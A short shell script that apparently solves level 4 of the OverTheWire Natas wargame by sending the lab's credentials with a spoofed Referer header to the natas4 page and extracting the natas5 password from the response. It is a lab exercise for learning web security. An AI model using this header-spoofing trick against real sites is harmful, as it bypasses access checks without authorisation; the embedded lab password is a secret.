#!/bin/sh

RESPONSE=$(curl --silent \
                --user natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ \
                --referer http://natas5.natas.labs.overthewire.org/ \
                http://natas4.natas.labs.overthewire.org/)
PASSWORD=$(echo ${RESPONSE} | grep -Po "(?<=The password for natas5 is )[A-Za-z0-9]{32}")
printf "The password for natas05 is: ${PASSWORD}\n"
